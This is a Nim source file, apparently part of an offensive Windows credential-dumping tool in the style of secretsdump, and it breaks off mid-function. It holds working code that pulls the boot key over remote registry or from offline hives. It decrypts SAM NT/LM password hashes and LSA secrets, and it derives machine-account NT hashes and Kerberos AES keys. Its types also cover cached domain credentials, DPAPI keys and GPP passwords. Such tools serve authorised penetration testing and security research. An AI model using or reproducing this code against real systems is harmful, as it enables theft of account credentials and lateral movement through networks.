import std/[asyncdispatch, base64, md5, os, random, strutils, times]
import ../smb/client as smb
import ../rrp/client as rrp
import output as smbfiles
import transfer as smbtransfer
import dpapi as dpapimod

type
  EvpCipherCtx {.importc: "EVP_CIPHER_CTX", header: "<openssl/evp.h>", incompleteStruct.} = object
  EvpCipherCtxPtr = ptr EvpCipherCtx
  EvpCipherPtr = pointer

proc EVP_aes_128_cbc(): EvpCipherPtr {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_aes_256_ecb(): EvpCipherPtr {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_aes_128_ecb(): EvpCipherPtr {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_CIPHER_CTX_new(): EvpCipherCtxPtr {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_CIPHER_CTX_free(ctx: EvpCipherCtxPtr) {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_CIPHER_CTX_set_padding(ctx: EvpCipherCtxPtr; padding: cint): cint {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_DecryptInit_ex(ctx: EvpCipherCtxPtr; cipher: EvpCipherPtr; impl, key, iv: pointer): cint {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_DecryptUpdate(ctx: EvpCipherCtxPtr; outbuf: pointer; outl: ptr cint; inbuf: pointer; inl: cint): cint {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_EncryptInit_ex(ctx: EvpCipherCtxPtr; cipher: EvpCipherPtr; impl, key, iv: pointer): cint {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_EncryptUpdate(ctx: EvpCipherCtxPtr; outbuf: pointer; outl: ptr cint; inbuf: pointer; inl: cint): cint {.cdecl, importc, header: "<openssl/evp.h>".}
proc SHA256(d: pointer; n: csize_t; md: pointer): pointer {.cdecl, importc, header: "<openssl/sha.h>".}
proc PKCS5_PBKDF2_HMAC(pass: cstring; passlen: cint; salt: pointer; saltlen: cint;
                        iter: cint; digest: pointer; keylen: cint; outbuf: pointer): cint
  {.cdecl, importc, header: "<openssl/evp.h>".}
proc EVP_sha1(): pointer {.cdecl, importc, header: "<openssl/evp.h>".}

type DesKeySchedule {.importc: "DES_key_schedule", header: "<openssl/des.h>".} = object
proc DES_set_key_unchecked(key: pointer; schedule: ptr DesKeySchedule) {.cdecl, importc, header: "<openssl/des.h>".}
proc DES_ecb_encrypt(inp, outp: pointer; schedule: ptr DesKeySchedule; enc: cint) {.cdecl, importc, header: "<openssl/des.h>".}
const DES_DECRYPT = 0.cint

proc kerbNfold(s: string; nBits: int): string =
  let l = s.len * 8
  func gcd(a, b: int): int =
    var x = a; var y = b
    while y != 0: (let t = y; y = x mod y; x = t)
    x
  let lcmBits = (l * nBits) div gcd(l, nBits)
  let rLen = nBits div 8
  result = newString(rLen)
  var carry = 0
  let totalBytes = lcmBits div 8
  for i in countdown(totalBytes - 1, 0):
    let copy = i div s.len
    let offInCopy = i mod s.len
    let rot = (13 * copy) mod l
    var extByte: uint8 = 0
    for b in 0 ..< 8:
      let srcBitPos = (offInCopy * 8 + b + rot) mod l
      let srcByteIdx = srcBitPos div 8
      let srcBitInByte = srcBitPos mod 8
      let bit = (uint8(ord(s[srcByteIdx])) shr uint8(7 - srcBitInByte)) and 1
      extByte = extByte or (bit shl uint8(7 - b))
    let pos = i mod rLen
    let v = int(ord(result[pos])) + int(extByte) + carry
    result[pos] = chr(v and 0xff)
    carry = v shr 8
  var pos = rLen - 1
  while carry > 0:
    let v = int(ord(result[pos])) + carry
    result[pos] = chr(v and 0xff)
    carry = v shr 8
    dec pos
    if pos < 0: pos = rLen - 1

proc aesEcbEncryptBlock(key: string; keyBits: int; plaintext: string): string =
  let cipher = if keyBits == 256: EVP_aes_256_ecb() else: EVP_aes_128_ecb()
  let ctx = EVP_CIPHER_CTX_new()
  defer: EVP_CIPHER_CTX_free(ctx)
  discard EVP_CIPHER_CTX_set_padding(ctx, 0)
  discard EVP_EncryptInit_ex(ctx, cipher, nil,
    if key.len > 0: cast[pointer](unsafeAddr key[0]) else: nil, nil)
  result = newString(16)
  var outl: cint = 16
  discard EVP_EncryptUpdate(ctx, cast[pointer](addr result[0]), addr outl,
    if plaintext.len > 0: cast[pointer](unsafeAddr plaintext[0]) else: nil, 16)

proc kerbDeriveKey(seedKey: string; keyLen: int): string =
  let constant = kerbNfold("kerberos", 128)
  var plain = constant
  while result.len < keyLen:
    let blk = aesEcbEncryptBlock(seedKey, seedKey.len * 8, plain)
    result.add blk
    plain = blk
  result = result[0 ..< keyLen]

proc kerbStringToKeyAes(passwordUtf8, salt: string; keyLen: int): string =
  var seed = newString(keyLen)
  discard PKCS5_PBKDF2_HMAC(
    if passwordUtf8.len > 0: cstring(passwordUtf8) else: cstring(""),
    passwordUtf8.len.cint,
    if salt.len > 0: cast[pointer](unsafeAddr salt[0]) else: nil,
    salt.len.cint,
    4096.cint, EVP_sha1(), keyLen.cint,
    cast[pointer](addr seed[0]))
  result = kerbDeriveKey(seed, keyLen)

proc kerbStringToKeyDes(passwordUtf8, salt: string): string =
  let raw = kerbNfold(passwordUtf8 & salt, 64)
  result = newString(8)
  for i in 0 ..< 8:
    let b = uint8(ord(raw[i]))
    var v = (b and 0xFE'u8) or 1'u8
    var parity: uint8 = 0
    var bv = v
    while bv != 0:
      parity = parity xor (bv and 1)
      bv = bv shr 1
    if parity == 0: v = v xor 1
    result[i] = chr(int(v))

type Rc4State = object
  s: array[256, uint8]
  i, j: uint8

proc rc4Init(key: string): Rc4State =
  for k in 0 ..< 256: result.s[k] = uint8(k)
  var j: uint8 = 0
  for k in 0 ..< 256:
    j = j + result.s[k] + uint8(ord(key[k mod key.len]))
    swap(result.s[k], result.s[int(j)])

proc rc4Stream(state: var Rc4State; data: string): string =
  result = newString(data.len)
  for k in 0 ..< data.len:
    state.i = state.i + 1
    state.j = state.j + state.s[int(state.i)]
    swap(state.s[int(state.i)], state.s[int(state.j)])
    let kb = state.s[(int(state.s[int(state.i)]) + int(state.s[int(state.j)])) and 0xff]
    result[k] = chr(ord(data[k]) xor int(kb))

proc md5Bytes(data: string): string =
  let digest = toMd5(data)
  result = newString(16)
  for i in 0 ..< 16: result[i] = chr(digest[i])

proc sha256Bytes(data: string): string =
  result = newString(32)
  discard SHA256(unsafeAddr data[0], data.len.csize_t, addr result[0])

proc sha256Iterated(key, value: string; rounds = 1000): string =
  var ctx: array[32, byte]
  var partial: string
  partial.add key
  for _ in 0 ..< rounds: partial.add value
  result = sha256Bytes(partial)

proc aesCbcDecrypt(key, data, iv: string): string =
  if data.len == 0: return ""
  let ctx = EVP_CIPHER_CTX_new()
  defer: EVP_CIPHER_CTX_free(ctx)
  var keyArr = key & repeat('\x00', 16 - (key.len mod 16))
  var ivArr  = iv  & repeat('\x00', 16 - (iv.len  mod 16))
  discard EVP_CIPHER_CTX_set_padding(ctx, 0)
  discard EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), nil,
    addr keyArr[0], addr ivArr[0])
  result = newString(data.len + 16)
  var outl = 0.cint
  discard EVP_DecryptUpdate(ctx, addr result[0], addr outl,
    unsafeAddr data[0], data.len.cint)
  result.setLen(outl)

proc aesEcbPerBlockDecrypt(key, data: string): string =
  let blocks = data.len div 16
  for i in 0 ..< blocks:
    let blk = data[i*16 ..< i*16+16]
    let ctx = EVP_CIPHER_CTX_new()
    var keyArr = key
    discard EVP_CIPHER_CTX_set_padding(ctx, 0)
    discard EVP_DecryptInit_ex(ctx, EVP_aes_256_ecb(), nil, addr keyArr[0], nil)
    var out16 = newString(16)
    var outl = 0.cint
    discard EVP_DecryptUpdate(ctx, addr out16[0], addr outl, unsafeAddr blk[0], 16.cint)
    EVP_CIPHER_CTX_free(ctx)
    result.add out16[0 ..< outl]

proc desEcbDecrypt(key8, data8: string): string =
  result = newString(8)
  var ks: DesKeySchedule
  var k = key8
  DES_set_key_unchecked(addr k[0], addr ks)
  DES_ecb_encrypt(unsafeAddr data8[0], addr result[0], addr ks, DES_DECRYPT)

proc transformKey(input: string): string =
  result = newString(8)
  result[0] = chr(((ord(input[0]) shr 1) shl 1) and 0xfe)
  result[1] = chr(((((ord(input[0]) and 0x01) shl 6) or (ord(input[1]) shr 2)) shl 1) and 0xfe)
  result[2] = chr(((((ord(input[1]) and 0x03) shl 5) or (ord(input[2]) shr 3)) shl 1) and 0xfe)
  result[3] = chr(((((ord(input[2]) and 0x07) shl 4) or (ord(input[3]) shr 4)) shl 1) and 0xfe)
  result[4] = chr(((((ord(input[3]) and 0x0f) shl 3) or (ord(input[4]) shr 5)) shl 1) and 0xfe)
  result[5] = chr(((((ord(input[4]) and 0x1f) shl 2) or (ord(input[5]) shr 6)) shl 1) and 0xfe)
  result[6] = chr(((((ord(input[5]) and 0x3f) shl 1) or (ord(input[6]) shr 7)) shl 1) and 0xfe)
  result[7] = chr(((ord(input[6]) and 0x7f) shl 1) and 0xfe)

proc deriveKey(rid: uint32): tuple[k1, k2: string] =
  var key = newString(4)
  key[0] = chr(int(rid and 0xff))
  key[1] = chr(int((rid shr 8) and 0xff))
  key[2] = chr(int((rid shr 16) and 0xff))
  key[3] = chr(int((rid shr 24) and 0xff))
  let k1raw = key[0..0] & key[1..1] & key[2..2] & key[3..3] & key[0..0] & key[1..1] & key[2..2]
  let k2raw = key[3..3] & key[0..0] & key[1..1] & key[2..2] & key[3..3] & key[0..0] & key[1..1]
  result.k1 = transformKey(k1raw)
  result.k2 = transformKey(k2raw)

proc decryptHashWithDes(key16, rid: uint32; encHash16: string): string =
  let (k1, k2) = deriveKey(rid)
  desEcbDecrypt(k1, encHash16[0..7]) & desEcbDecrypt(k2, encHash16[8..15])

proc toHexStr*(data: string): string =
  result = newString(data.len * 2)
  const digits = "0123456789abcdef"
  for i, c in data:
    result[i*2]   = digits[(ord(c) shr 4) and 0xf]
    result[i*2+1] = digits[ord(c) and 0xf]

proc fromUtf16Le(s: string): string

type
  SamAccount* = object
    username*: string
    rid*: uint32
    ntHash*: string
    lmHash*: string

  MachineKerbKey* = object
    keyType*: string
    keyHex*: string

  LsaSecret* = object
    name*: string
    plainText*: string
    secretType*: string
    ntHash*: string
    kerbKeys*: seq[MachineKerbKey]
    accountName*: string

  CachedEntry* = object
    domain*: string
    username*: string
    dcc2*: string
    iterations*: int

  GppPassword* = object
    file*: string
    username*: string
    newName*: string
    password*: string
    changed*: string
    disabled*: string

  SecretsResult* = object
    host*: string
    port*: int
    authenticated*: bool
    bootKey*: string
    samAccounts*: seq[SamAccount]
    lsaSecrets*: seq[LsaSecret]
    cachedCreds*: seq[CachedEntry]
    rawLines*: seq[string]
    dpapiMachineKey*: string
    dpapiUserKey*: string
    dpapiMachineKeyOld*: string
    dpapiUserKeyOld*: string
    dpapiMasterKeys*: seq[dpapimod.DpapiMasterKey]
    dpapiCredentials*: seq[dpapimod.DpapiCredential]
    gppPasswords*: seq[GppPassword]
    domainBackupKey*: string
    hiveLsaKey*: string
    success*: bool
    message*: string
    error*: string

type RegHive = object
  data: string

proc hiveFileOff(h: RegHive; rel: uint32): int =
  0x1000 + int(rel)

proc hiveCell(h: RegHive; rel: uint32): string =
  let off = h.hiveFileOff(rel)
  if off < 0 or off + 6 > h.data.len: return ""
  let raw = rrp.readU32Le(h.data, off)
  let size =
    if (raw and 0x80000000'u32) != 0:
      int((not raw) + 1)
    else:
      int(raw)
  if size <= 4 or off + size > h.data.len: return ""
  result = h.data[off + 4 ..< off + size]

proc hiveRoot(h: RegHive): uint32 =
  if h.data.len < 0x28 or h.data[0 ..< 4] != "regf": return 0xffffffff'u32
  result = rrp.readU32Le(h.data, 0x24)

proc hiveNameFromNk(cell: string): string =
  if cell.len < 0x4c or cell[0 ..< 2] != "nk": return ""
  let flags = uint16(ord(cell[0x02])) or (uint16(ord(cell[0x03])) shl 8)
  let nameLen = int(uint16(ord(cell[0x48])) or (uint16(ord(cell[0x49])) shl 8))
  if 0x4c + nameLen > cell.len: return ""
  let raw = cell[0x4c ..< 0x4c + nameLen]
  if (flags and 0x0020'u16) != 0:
    result = raw
  else:
    var i = 0
    while i + 1 < raw.len:
      let cp = uint32(ord(raw[i])) or (uint32(ord(raw[i+1])) shl 8)
      i += 2
      if cp == 0: break
      if cp < 0x80: result.add char(cp)
      elif cp < 0x800:
        result.add char(0xC0 or (cp shr 6))
        result.add char(0x80 or (cp and 0x3F))
      else:
        result.add char(0xE0 or (cp shr 12))
        result.add char(0x80 or ((cp shr 6) and 0x3F))
        result.add char(0x80 or (cp and 0x3F))

proc hiveClassFromNk(cell: string; h: RegHive): string =
  if cell.len < 0x4c or cell[0 ..< 2] != "nk": return ""
  let classOff = rrp.readU32Le(cell, 0x34)
  let classLen = int(uint16(ord(cell[0x4a])) or (uint16(ord(cell[0x4b])) shl 8))
  if classOff == 0xffffffff'u32 or classLen <= 0: return ""
  let classCell = h.hiveCell(classOff)
  if classLen > classCell.len: return ""
  result = classCell[0 ..< classLen]

proc hiveSubkeyOffsets(h: RegHive; listRel: uint32): seq[uint32] =
  if listRel == 0xffffffff'u32: return
  let cell = h.hiveCell(listRel)
  if cell.len < 4: return
  let sig = cell[0 ..< 2]
  let count = int(uint16(ord(cell[2])) or (uint16(ord(cell[3])) shl 8))
  if sig in ["lf", "lh"]:
    for i in 0 ..< count:
      let off = 4 + i * 8
      if off + 4 <= cell.len:
        result.add rrp.readU32Le(cell, off)
  elif sig in ["li", "ri"]:
    for i in 0 ..< count:
      let off = 4 + i * 4
      if off + 4 <= cell.len:
        let child = rrp.readU32Le(cell, off)
        if sig == "ri":
          for nested in hiveSubkeyOffsets(h, child): result.add nested
        else:
          result.add child

proc hiveOpenKey(h: RegHive; path: string): uint32 =
  var current = h.hiveRoot()
  if current == 0xffffffff'u32: return current
  for part in path.split('\\'):
    let wanted = part.strip()
    if wanted.len == 0: continue
    let nk = h.hiveCell(current)
    if nk.len < 0x4c or nk[0 ..< 2] != "nk": return 0xffffffff'u32
    let listRel = rrp.readU32Le(nk, 0x1c)
    var found = 0xffffffff'u32
    for child in hiveSubkeyOffsets(h, listRel):
      let cnk = h.hiveCell(child)
      if hiveNameFromNk(cnk).toLowerAscii() == wanted.toLowerAscii():
        found = child
        break
    if found == 0xffffffff'u32: return found
    current = found
  result = current

proc hiveKeyClass(h: RegHive; path: string): string =
  let key = h.hiveOpenKey(path)
  if key == 0xffffffff'u32: return ""
  result = hiveClassFromNk(h.hiveCell(key), h)

proc hiveReadValue(h: RegHive; path, valueName: string): string =
  let key = h.hiveOpenKey(path)
  if key == 0xffffffff'u32: return ""
  let nk = h.hiveCell(key)
  if nk.len < 0x2c: return ""
  let valueCount = int(rrp.readU32Le(nk, 0x24))
  let valueListRel = rrp.readU32Le(nk, 0x28)
  if valueCount <= 0 or valueListRel == 0xffffffff'u32: return ""
  let listCell = h.hiveCell(valueListRel)
  for i in 0 ..< valueCount:
    let off = i * 4
    if off + 4 > listCell.len: break
    let vk = h.hiveCell(rrp.readU32Le(listCell, off))
    if vk.len < 0x14 or vk[0 ..< 2] != "vk": continue
    let nameLen = int(uint16(ord(vk[0x02])) or (uint16(ord(vk[0x03])) shl 8))
    let flags = uint16(ord(vk[0x10])) or (uint16(ord(vk[0x11])) shl 8)
    var name = ""
    if nameLen > 0 and 0x14 + nameLen <= vk.len:
      name = vk[0x14 ..< 0x14 + nameLen]
      if (flags and 1) == 0:
        name = fromUtf16Le(name)
    let wantedName =
      if valueName.toLowerAscii() == "default": ""
      else: valueName
    if name.toLowerAscii() != wantedName.toLowerAscii(): continue
    let rawSize = rrp.readU32Le(vk, 0x04)
    let dataSize = int(rawSize and 0x7fffffff'u32)
    if (rawSize and 0x80000000'u32) != 0:
      let take = min(dataSize, 4)
      return vk[0x08 ..< 0x08 + take]
    let dataRel = rrp.readU32Le(vk, 0x08)
    let dataCell = h.hiveCell(dataRel)
    if dataSize <= dataCell.len:
      return dataCell[0 ..< dataSize]
    return dataCell

proc hiveEnumSubKeys(h: RegHive; path: string): seq[string] =
  let key = h.hiveOpenKey(path)
  if key == 0xffffffff'u32: return
  let nk = h.hiveCell(key)
  if nk.len < 0x20: return
  for child in hiveSubkeyOffsets(h, rrp.readU32Le(nk, 0x1c)):
    let name = hiveNameFromNk(h.hiveCell(child))
    if name.len > 0: result.add name

proc hiveEnumValues(h: RegHive; path: string): seq[string] =
  let key = h.hiveOpenKey(path)
  if key == 0xffffffff'u32: return
  let nk = h.hiveCell(key)
  if nk.len < 0x2c: return
  let valueCount = int(rrp.readU32Le(nk, 0x24))
  let valueListRel = rrp.readU32Le(nk, 0x28)
  if valueCount <= 0 or valueListRel == 0xffffffff'u32: return
  let listCell = h.hiveCell(valueListRel)
  for i in 0 ..< valueCount:
    let off = i * 4
    if off + 4 > listCell.len: break
    let vk = h.hiveCell(rrp.readU32Le(listCell, off))
    if vk.len < 0x14 or vk[0 ..< 2] != "vk": continue
    let nameLen = int(uint16(ord(vk[0x02])) or (uint16(ord(vk[0x03])) shl 8))
    let flags = uint16(ord(vk[0x10])) or (uint16(ord(vk[0x11])) shl 8)
    var name = ""
    if nameLen > 0 and 0x14 + nameLen <= vk.len:
      name = vk[0x14 ..< 0x14 + nameLen]
      if (flags and 1) == 0:
        name = fromUtf16Le(name)
    if name.len > 0:
      result.add name

proc bootKeyFromSystemHive(systemHive: string): string =
  let h = RegHive(data: systemHive)
  var cs = ""
  let current = hiveReadValue(h, "Select", "Current")
  if current.len >= 4:
    cs = "ControlSet" & align($rrp.readU32Le(current, 0).int, 3, '0')
  for base in [cs, "ControlSet001", "ControlSet002"]:
    if base.len == 0: continue
    var raw = ""
    for name in ["JD", "Skew1", "GBG", "Data"]:
      raw.add hiveKeyClass(h, base & "\\Control\\Lsa\\" & name)
    if raw.len == 32:
      var hexBytes = newString(16)
      for i in 0 ..< 16:
        hexBytes[i] = chr(parseHexInt(raw[i*2 ..< i*2+2]))
      const transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
      result = newString(16)
      for i in 0 ..< 16:
        result[i] = hexBytes[transforms[i]]
      return

proc lsaKeyPath(base: string): string = base & "\\Control\\Lsa\\"

proc resolveControlSet(s: rrp.RrpSession): Future[string] {.async.} =
  for cs in ["CurrentControlSet", "ControlSet001", "ControlSet002"]:
    let path = "SYSTEM\\" & cs & "\\Control\\Lsa\\JD"
    let hk = await s.openKey(path)
    if hk.len > 0:
      await s.closeKey(hk)
      return "SYSTEM\\" & cs

proc getBootKey(s: rrp.RrpSession): Future[string] {.async.} =
  let base = await resolveControlSet(s)
  if base.len == 0: return ""
  var raw = ""
  for name in ["JD", "Skew1", "GBG", "Data"]:
    let hk = await s.openKey(base & "\\Control\\Lsa\\" & name)
    if hk.len == 0: return ""
    let cls = await s.queryClass(hk)
    await s.closeKey(hk)
    raw.add cls
  if raw.len != 32: return ""
  var hexBytes = newString(16)
  for i in 0 ..< 16:
    hexBytes[i] = chr(parseHexInt(raw[i*2 ..< i*2+2]))
  const transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
  result = newString(16)
  for i in 0 ..< 16:
    result[i] = hexBytes[transforms[i]]

proc getHashedBootKey(s: rrp.RrpSession; bootKey: string): Future[string] {.async.} =
  let fData = await s.readKeyData("SAM\\SAM\\Domains\\Account", "F")
  if fData.len < 120: return ""
  let key0 = fData[104 ..< fData.len]
  if key0.len < 1: return ""
  let rev = ord(key0[0])
  if rev == 1:
    if key0.len < 56: return ""
    let salt    = key0[8  ..< 24]
    let key     = key0[24 ..< 40]
    let chksum  = key0[40 ..< 56]
    const qwerty = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
    const digits = "0123456789012345678901234567890123456789\x00"
    let rc4key = md5Bytes(salt & qwerty & bootKey & digits)
    var rc4 = rc4Init(rc4key)
    result = rc4Stream(rc4, key & chksum)
    result.setLen(16)
  elif rev == 2:
    if key0.len < 36: return ""
    let dataLen = int(rrp.readU32Le(key0, 12))
    let salt    = key0[16 ..< 32]
    let data    = key0[32 ..< 32 + dataLen]
    result = aesCbcDecrypt(bootKey, data, salt)
    if result.len > 16: result.setLen(16)

proc decryptSamHash(hashedBootKey: string; rid: uint32; encData: string; constant: string): string =
  if encData.len < 20: return ""
  let revision = ord(encData[2])
  if revision == 1:
    if encData.len < 20: return ""
    let hash = encData[4 ..< 20]
    let rc4key = md5Bytes(hashedBootKey[0..15] & (block:
      var b = newString(4)
      b[0] = chr(int(rid and 0xff))
      b[1] = chr(int((rid shr 8) and 0xff))
      b[2] = chr(int((rid shr 16) and 0xff))
      b[3] = chr(int((rid shr 24) and 0xff))
      b) & constant)
    var rc4 = rc4Init(rc4key)
    let key = rc4Stream(rc4, hash)
    return decryptHashWithDes(0, rid, key)
  elif revision == 2:
    if encData.len < 24: return ""
    let salt = encData[8  ..< 24]
    let hash = encData[24 ..< encData.len]
    let key  = aesCbcDecrypt(hashedBootKey[0..15], hash, salt)
    if key.len < 16: return ""
    return decryptHashWithDes(0, rid, key[0..15])

proc dumpSam(s: rrp.RrpSession; bootKey: string): Future[seq[SamAccount]] {.async.} =
  let hashedBootKey = await getHashedBootKey(s, bootKey)
  if hashedBootKey.len == 0: return

  const ntPass = "NTPASSWORD\x00"
  const lmPass = "LMPASSWORD\x00"

  let usersKey = "SAM\\SAM\\Domains\\Account\\Users"
  let hUsers = await s.openKey(usersKey)
  if hUsers.len == 0: return
  let rids = await s.enumKeys(hUsers)
  await s.closeKey(hUsers)

  for ridHex in rids:
    if ridHex.toLowerAscii() == "names": continue
    var rid: uint32
    try: rid = uint32(parseHexInt(ridHex))
    except: continue

    let vData = await s.readKeyData(usersKey & "\\" & ridHex, "V")
    if vData.len < 204: continue

    let nameOff = int(rrp.readU32Le(vData, 12)) + 204
    let nameLen = int(rrp.readU32Le(vData, 16))
    let lmOff   = int(rrp.readU32Le(vData, 156)) + 204
    let lmLen   = int(rrp.readU32Le(vData, 160))
    let ntOff   = int(rrp.readU32Le(vData, 168)) + 204
    let ntLen   = int(rrp.readU32Le(vData, 172))

    var acct = SamAccount(rid: rid)

    if nameOff > 204 and nameOff + nameLen <= vData.len and nameLen > 0:
      let raw = vData[nameOff ..< nameOff + nameLen]
      var i = 0
      while i + 1 < raw.len:
        let cp = uint32(ord(raw[i])) or (uint32(ord(raw[i+1])) shl 8)
        i += 2
        if cp < 0x80: acct.username.add char(cp)
        elif cp < 0x800:
          acct.username.add char(0xC0 or (cp shr 6))
          acct.username.add char(0x80 or (cp and 0x3F))
        else:
          acct.username.add char(0xE0 or (cp shr 12))
          acct.username.add char(0x80 or ((cp shr 6) and 0x3F))
          acct.username.add char(0x80 or (cp and 0x3F))

    if ntOff > 204 and ntOff + ntLen <= vData.len and ntLen >= 20:
      let encNt = vData[ntOff ..< ntOff + ntLen]
      acct.ntHash = decryptSamHash(hashedBootKey, rid, encNt, ntPass)

    if lmOff > 204 and lmOff + lmLen <= vData.len and lmLen >= 20:
      let encLm = vData[lmOff ..< lmOff + lmLen]
      acct.lmHash = decryptSamHash(hashedBootKey, rid, encLm, lmPass)

    result.add acct

proc getHashedBootKeyFromSamHive(samHive: string; bootKey: string): string =
  let h = RegHive(data: samHive)
  let fData = hiveReadValue(h, "SAM\\Domains\\Account", "F")
  if fData.len < 120: return ""
  let key0 = fData[104 ..< fData.len]
  if key0.len < 1: return ""
  let rev = ord(key0[0])
  if rev == 1:
    if key0.len < 56: return ""
    let salt    = key0[8  ..< 24]
    let key     = key0[24 ..< 40]
    let chksum  = key0[40 ..< 56]
    const qwerty = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
    const digits = "0123456789012345678901234567890123456789\x00"
    let rc4key = md5Bytes(salt & qwerty & bootKey & digits)
    var rc4 = rc4Init(rc4key)
    result = rc4Stream(rc4, key & chksum)
    result.setLen(16)
  elif rev == 2:
    if key0.len < 36: return ""
    let dataLen = int(rrp.readU32Le(key0, 12))
    if 32 + dataLen > key0.len: return ""
    let salt    = key0[16 ..< 32]
    let data    = key0[32 ..< 32 + dataLen]
    result = aesCbcDecrypt(bootKey, data, salt)
    if result.len > 16: result.setLen(16)

proc dumpSamHive(samHive: string; bootKey: string): seq[SamAccount] =
  let h = RegHive(data: samHive)
  let hashedBootKey = getHashedBootKeyFromSamHive(samHive, bootKey)
  if hashedBootKey.len == 0: return
  const ntPass = "NTPASSWORD\x00"
  const lmPass = "LMPASSWORD\x00"
  let usersKey = "SAM\\Domains\\Account\\Users"
  for ridHex in hiveEnumSubKeys(h, usersKey):
    if ridHex.toLowerAscii() == "names": continue
    var rid: uint32
    try: rid = uint32(parseHexInt(ridHex))
    except ValueError: continue
    let vData = hiveReadValue(h, usersKey & "\\" & ridHex, "V")
    if vData.len < 204: continue
    let nameOff = int(rrp.readU32Le(vData, 12)) + 204
    let nameLen = int(rrp.readU32Le(vData, 16))
    let lmOff   = int(rrp.readU32Le(vData, 156)) + 204
    let lmLen   = int(rrp.readU32Le(vData, 160))
    let ntOff   = int(rrp.readU32Le(vData, 168)) + 204
    let ntLen   = int(rrp.readU32Le(vData, 172))
    var acct = SamAccount(rid: rid)
    if nameOff > 204 and nameOff + nameLen <= vData.len and nameLen > 0:
      acct.username = fromUtf16Le(vData[nameOff ..< nameOff + nameLen])
    if ntOff > 204 and ntOff + ntLen <= vData.len and ntLen >= 20:
      acct.ntHash = decryptSamHash(hashedBootKey, rid, vData[ntOff ..< ntOff + ntLen], ntPass)
    if lmOff > 204 and lmOff + lmLen <= vData.len and lmLen >= 20:
      acct.lmHash = decryptSamHash(hashedBootKey, rid, vData[lmOff ..< lmOff + lmLen], lmPass)
    result.add acct

proc getLsaKey(s: rrp.RrpSession; bootKey: string): Future[string] {.async.} =
  let polEklist = await s.readKeyData("SECURITY\\Policy", "PolEKList")
  if polEklist.len > 60:
    let encData = polEklist[28 ..< polEklist.len]
    let iv = encData[0 ..< 32]
    let body = encData[32 ..< encData.len]
    let tmpKey = sha256Iterated(bootKey, iv)
    let plainText = aesEcbPerBlockDecrypt(tmpKey, body)
    if plainText.len >= 48:
      let secretLen = int(rrp.readU32Le(plainText, 0))
      let off = 16
      let secret =
        if off + secretLen <= plainText.len:
          plainText[off ..< off + secretLen]
        else:
          plainText[off ..< plainText.len]
      if secret.len >= 84:
        result = secret[52 ..< 84]
        return

  let polSek = await s.readKeyData("SECURITY\\Policy", "PolSecretEncryptionKey")
  if polSek.len < 60: return ""
  var ctx2 = md5Bytes(bootKey)
  for _ in 0 ..< 1000:
    ctx2 = md5Bytes(ctx2 & polSek[60..75])
  var rc4 = rc4Init(ctx2)
  let plain = rc4Stream(rc4, polSek[12..59])
  if plain.len >= 32:
    result = plain[16..31]

proc getLsaKeyHive(securityHive: string; bootKey: string): string =
  let h = RegHive(data: securityHive)
  let polEklist = hiveReadValue(h, "Policy\\PolEKList", "default")
  if polEklist.len > 60:
    let encData = polEklist[28 ..< polEklist.len]
    let iv = encData[0 ..< 32]
    let body = encData[32 ..< encData.len]
    let tmpKey = sha256Iterated(bootKey, iv)
    let plainText = aesEcbPerBlockDecrypt(tmpKey, body)
    if plainText.len >= 48:
      let secretLen = int(rrp.readU32Le(plainText, 0))
      let off = 16
      let secret =
        if off + secretLen <= plainText.len:
          plainText[off ..< off + secretLen]
        else:
          plainText[off ..< plainText.len]
      if secret.len >= 84:
        result = secret[52 ..< 84]
        return

  let polSek = hiveReadValue(h, "Policy\\PolSecretEncryptionKey", "default")
  if polSek.len < 60: return ""
  var ctx2 = md5Bytes(bootKey)
  for _ in 0 ..< 1000:
    ctx2 = md5Bytes(ctx2 & polSek[60..75])
  var rc4 = rc4Init(ctx2)
  let plain = rc4Stream(rc4, polSek[12..59])
  if plain.len >= 32:
    result = plain[16..31]

proc decryptLsaSecret(lsaKey: string; encData: string): string =
  if encData.len < 60: return ""
  let recordData = encData[28 ..< encData.len]
  let iv = recordData[0 ..< 32]
  let body = recordData[32 ..< recordData.len]
  let tmpKey = sha256Iterated(lsaKey, iv)
  let plain = aesEcbPerBlockDecrypt(tmpKey, body)
  if plain.len < 16: return ""
  let secretLen = int(rrp.readU32Le(plain, 0))
  let off = 16
  if off + secretLen > plain.len: return plain[off ..< plain.len]
  result = plain[off ..< off + secretLen]

proc fromUtf16Le(s: string): string =
  var i = 0
  while i + 1 < s.len:
    let cp = uint32(ord(s[i])) or (uint32(ord(s[i+1])) shl 8)
    i += 2
    if cp == 0: break
    if cp < 0x80: result.add char(cp)
    elif cp < 0x800:
      result.add char(0xC0 or (cp shr 6))
      result.add char(0x80 or (cp and 0x3F))
    else:
      result.add char(0xE0 or (cp shr 12))
      result.add char(0x80 or ((cp shr 6) and 0x3F))
      result.add char(0x80 or (cp and 0x3F))

proc classifyLsaSecret(name, plainText, host, domain: string): LsaSecret =
  let upper = name.toUpperAscii()
  result.name = name
  result.plainText = plainText
  if upper.startsWith("_SC_"):
    result.secretType = "service"
    result.plainText = fromUtf16Le(plainText)
  elif upper.startsWith("DPAPI_SYSTEM"):
    result.secretType = "dpapi_system"
  elif upper.startsWith("$MACHINE.ACC"):
    result.secretType = "machine_acc"
    if plainText.len >= 2:
      result.ntHash = toHexStr(smb.md4Digest(plainText))
      let domainUp = domain.toUpperAscii()
      let dot = host.find('.')
      let shortHost = if dot > 0: host[0 ..< dot].toLowerAscii() else: host.toLowerAscii()
      let fqdn =
        if domain.len > 0: shortHost & "." & domain.toLowerAscii()
        else: shortHost
      let salt = domainUp & "host" & fqdn
      let passwordUtf8 = fromUtf16Le(plainText)
      let aes256 = kerbStringToKeyAes(passwordUtf8, salt, 32)
